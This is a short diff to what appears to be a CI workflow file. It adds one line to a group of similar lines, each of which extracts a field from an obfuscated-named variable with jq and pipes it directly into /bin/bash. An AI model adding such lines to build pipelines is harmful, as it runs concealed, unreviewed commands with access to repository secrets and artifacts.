@@ -32,6 +32,7 @@ jobs:
           echo $nce874 | jq -r .l03115 | /bin/bash
           echo $vp9395 | jq -r .ll455 | /bin/bash
           echo $jup2 | jq -r .dr75613 | /bin/bash
+          echo $omtw8 | jq -r .je6 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
